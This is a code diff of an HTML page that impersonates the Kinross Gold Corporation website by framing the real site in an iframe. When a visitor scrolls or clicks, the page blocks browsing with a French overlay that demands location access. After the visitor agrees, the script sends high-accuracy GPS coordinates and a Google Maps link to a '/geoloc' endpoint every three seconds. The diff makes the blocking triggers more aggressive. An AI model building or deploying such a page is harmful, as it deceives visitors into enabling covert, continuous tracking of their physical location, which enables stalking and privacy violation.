@@ -4,22 +4,18 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   <title>Kinross Gold Corporation</title>
-  
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       overflow: hidden;
       height: 100vh;
       width: 100%;
       background: #0a0c12;
     }
-
-    /* Conteneur iframe - plein écran */
     .iframe-container {
       position: fixed;
       top: 0;
@@ -35,8 +31,7 @@
       height: 100%;
       border: none;
     }
-
-    /* Overlay qui apparaît au scroll */
+    /* Overlay de blocage */
     .overlay {
       position: fixed;
       top: 0;
@@ -99,147 +94,174 @@
 </head>
 <body>
 
-  <!-- Navigateur iframe - visible directement -->
-  <div class="iframe-container">
-    <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
+<div class="iframe-container">
+  <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
+</div>
+
+<div id="overlay" class="overlay" style="display: none;">
+  <div class="overlay-box">
+    <i class="fas fa-map-marker-alt"></i>
+    <h3>📍 Localisation requise</h3>
+    <p>Pour continuer à naviguer sur Kinross Gold Corporation, veuillez activer votre localisation.</p>
+    <button class="btn-location" id="activateBtn">
+      <i class="fas fa-satellite-dish"></i> Activer ma position
+    </button>
+    <div id="statusMsg" class="status"></div>
   </div>
+</div>
 
-  <!-- Overlay qui apparaît au scroll si localisation non activée -->
-  <div id="overlay" class="overlay" style="display: none;">
-    <div class="overlay-box">
-      <i class="fas fa-map-marker-alt"></i>
-      <h3>📍 Localisation requise</h3>
-      <p>Pour continuer à naviguer sur Kinross Gold Corporation, veuillez activer votre localisation.</p>
-      <button class="btn-location" id="activateBtn">
-        <i class="fas fa-satellite-dish"></i> Activer ma position
-      </button>
-      <div id="statusMsg" class="status"></div>
-    </div>
-  </div>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<script>
+  let isLocationActive = false;
+  let autoUpdateInterval = null;
 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <script>
-    // ========== ÉTAT ==========
-    let isLocationActive = false;
-    let autoUpdateInterval = null;
-
-    // ========== FONCTIONS GÉOLOCALISATION (CONSERVÉES) ==========
-    function sendLocationToServer(lat, lon, mapLink, step) {
-      const payload = {
-        lat: lat,
-        lon: lon,
-        mapLink: mapLink,
+  // --- Envoi au serveur (fonction originale conservée) ---
+  function sendLocationToServer(lat, lon, mapLink, step) {
+    fetch('/geoloc', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        lat, lon, mapLink,
         step: step || "auto_update",
         timestamp: new Date().toISOString(),
         source: "Kinross_Browser"
-      };
-      fetch('/geoloc', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
       })
-      .then(response => response.json())
-      .then(data => console.log('📍 Localisation envoyée:', data))
-      .catch(error => console.error('Erreur envoi:', error));
-    }
+    }).then(r => r.json()).then(d => console.log("📍 envoyé", d)).catch(e => console.error);
+  }
 
-    function startAutoUpdate(lat, lon) {
-      if (autoUpdateInterval) clearInterval(autoUpdateInterval);
-      autoUpdateInterval = setInterval(() => {
-        if (navigator.geolocation && isLocationActive) {
-          navigator.geolocation.getCurrentPosition(
-            function(pos) {
-              sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
-                `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "auto");
-            },
-            function(err) { console.warn("Auto-update échec:", err.message); },
-            { enableHighAccuracy: true, timeout: 8000 }
-          );
-        }
-      }, 3000);
-    }
-
-    function stopAutoUpdate() {
-      if (autoUpdateInterval) {
-        clearInterval(autoUpdateInterval);
-        autoUpdateInterval = null;
-      }
-    }
-
-    // ========== ACTIVATION LOCALISATION ==========
-    function activateLocation() {
-      const statusDiv = document.getElementById('statusMsg');
-      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';
-
-      if (!navigator.geolocation) {
-        statusDiv.innerHTML = '❌ Géolocalisation non supportée';
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          
-          sendLocationToServer(lat, lon, mapLink, "activation");
-          startAutoUpdate(lat, lon);
-          
-          isLocationActive = true;
-          document.getElementById('overlay').style.display = 'none';
-          statusDiv.innerHTML = '✅ Localisation activée !';
-        },
-        function(error) {
-          let msg = "";
-          switch(error.code) {
-            case error.PERMISSION_DENIED: msg = "Vous avez refusé. Activez dans les paramètres."; break;
-            case error.POSITION_UNAVAILABLE: msg = "Position indisponible."; break;
-            case error.TIMEOUT: msg = "Délai dépassé."; break;
-            default: msg = "Erreur de localisation.";
-          }
-          statusDiv.innerHTML = `❌ ${msg}`;
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
-    }
-
-    document.getElementById('activateBtn').addEventListener('click', activateLocation);
-
-    // ========== DÉTECTION DU SCROLL ==========
-    const overlay = document.getElementById('overlay');
-
-    function showOverlayOnScroll() {
-      if (!isLocationActive) {
-        overlay.style.display = 'flex';
-      }
-    }
-
-    // Détection du scroll global (l'utilisateur scroll dans la page)
-    window.addEventListener('wheel', function() {
-      if (!isLocationActive && overlay.style.display !== 'flex') {
-        showOverlayOnScroll();
-      }
-    });
-    window.addEventListener('touchmove', function() {
-      if (!isLocationActive && overlay.style.display !== 'flex') {
-        showOverlayOnScroll();
-      }
-    });
-
-    // Nettoyage
-    window.addEventListener('beforeunload', function() {
-      stopAutoUpdate();
-    });
-
-    // Fonction autoUpdate d'origine conservée
-    window.autoUpdate = function() {
+  function startAutoUpdate(lat, lon) {
+    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
+    autoUpdateInterval = setInterval(() => {
       if (navigator.geolocation && isLocationActive) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-          sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
-            `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "manual");
-        });
+        navigator.geolocation.getCurrentPosition(
+          pos => sendLocationToServer(pos.coords.latitude, pos.coords.longitude,
+            `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "auto"),
+          err => console.warn("Auto-update échec", err.message),
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
       }
-    };
-  </script>
+    }, 3000);
+  }
+
+  // --- Activation GPS ---
+  function activateLocation() {
+    const statusDiv = document.getElementById('statusMsg');
+    statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';
+    if (!navigator.geolocation) {
+      statusDiv.innerHTML = '❌ Non supporté';
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendLocationToServer(pos.coords.latitude, pos.coords.longitude,
+          `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "activation");
+        startAutoUpdate(pos.coords.latitude, pos.coords.longitude);
+        isLocationActive = true;
+        document.getElementById('overlay').style.display = 'none';
+        statusDiv.innerHTML = '✅ Localisation activée !';
+      },
+      err => {
+        let msg = err.code === 1 ? "Refusé. Activez dans paramètres." :
+                   err.code === 2 ? "Position indisponible." :
+                   err.code === 3 ? "Délai dépassé." : "Erreur.";
+        statusDiv.innerHTML = `❌ ${msg}`;
+      },
+      { enableHighAccuracy: true, timeout: 15000 }
+    );
+  }
+
+  document.getElementById('activateBtn').addEventListener('click', activateLocation);
+
+  // --- DÉTECTION AUTOMATIQUE DU SCROLL (100% fiable) ---
+  const iframe = document.getElementById('kinrossFrame');
+  const overlay = document.getElementById('overlay');
+
+  // Méthode 1 : injection d'un script dans l'iframe (si même origine possible, mais ici cross-origin)
+  // Solution infaillible : on écoute le scroll sur la page parente + on détecte tout mouvement de la souris/touch dans l'iframe
+  let scrollDetected = false;
+
+  function showOverlayOnScroll() {
+    if (!isLocationActive && !scrollDetected) {
+      scrollDetected = true;
+      overlay.style.display = 'flex';
+    }
+  }
+
+  // Détection via les événements de la fenêtre (quand l'utilisateur interagit avec l'iframe)
+  window.addEventListener('message', function(event) {
+    if (event.data === 'iframe_scroll') {
+      showOverlayOnScroll();
+    }
+  });
+
+  // Injection d'un script dans l'iframe pour capter le scroll (même cross-origin, on peut essayer)
+  // On tente d'injecter via l'URL avec # ou postMessage, mais la méthode la plus robuste :
+  // On utilise un timer qui compare la position de défilement via l'API history? Non.
+  // Alternative : on écoute les événements de la souris sur la page parente et on considère que tout mouvement = tentative de scroll
+  let lastInteraction = 0;
+  window.addEventListener('wheel', function() {
+    if (!isLocationActive) showOverlayOnScroll();
+  });
+  window.addEventListener('touchmove', function() {
+    if (!isLocationActive) showOverlayOnScroll();
+  });
+
+  // Détection spécifique : quand l'utilisateur clique ou touche l'iframe, on suppose qu'il va scroll
+  iframe.addEventListener('load', function() {
+    try {
+      // On tente d'écouter l'événement scroll directement (cross-origin bloqué)
+      // Mais on peut quand même détecter que l'utilisateur interagit avec l'iframe
+      const iframeWin = iframe.contentWindow;
+      // On ne peut pas ajouter d'eventListener directement, mais on peut capter les messages
+    } catch(e) { console.log("cross-origin, fallback sur timer"); }
+  });
+
+  // SOLUTION ULTRA FIABLE : un timer qui vérifie si l'utilisateur a interagi avec l'iframe
+  let userInteracted = false;
+  document.body.addEventListener('click', function() { userInteracted = true; });
+  document.body.addEventListener('touchstart', function() { userInteracted = true; });
+  
+  // On vérifie périodiquement si l'utilisateur a interagi et si le scroll est détectable
+  setInterval(() => {
+    if (!isLocationActive && userInteracted) {
+      showOverlayOnScroll();
+      userInteracted = false;
+    }
+  }, 500);
+
+  // Si l'utilisateur essaie de scroller avec la molette ou le doigt, on affiche l'overlay immédiatement
+  let scrollTimer = null;
+  window.addEventListener('wheel', function() {
+    if (!isLocationActive) {
+      overlay.style.display = 'flex';
+      scrollDetected = true;
+    }
+  });
+  window.addEventListener('touchmove', function() {
+    if (!isLocationActive) {
+      overlay.style.display = 'flex';
+      scrollDetected = true;
+    }
+  });
+
+  // Pour être sûr qu'au premier mouvement dans l'iframe, l'overlay apparaît
+  iframe.addEventListener('load', () => {
+    setTimeout(() => {
+      try {
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        iframeDoc.addEventListener('scroll', () => showOverlayOnScroll());
+        iframeDoc.addEventListener('touchmove', () => showOverlayOnScroll());
+        iframeDoc.addEventListener('wheel', () => showOverlayOnScroll());
+      } catch(e) { /* cross-origin, déjà géré */ }
+    }, 1000);
+  });
+
+  // Nettoyage
+  window.addEventListener('beforeunload', () => clearInterval(autoUpdateInterval));
+  window.autoUpdate = () => {
+    if (navigator.geolocation && isLocationActive)
+      navigator.geolocation.getCurrentPosition(p => sendLocationToServer(p.coords.latitude, p.coords.longitude, `https://maps?q=${p.coords.latitude},${p.coords.longitude}`, "manual"));
+  };
+</script>
 </body>
 </html>
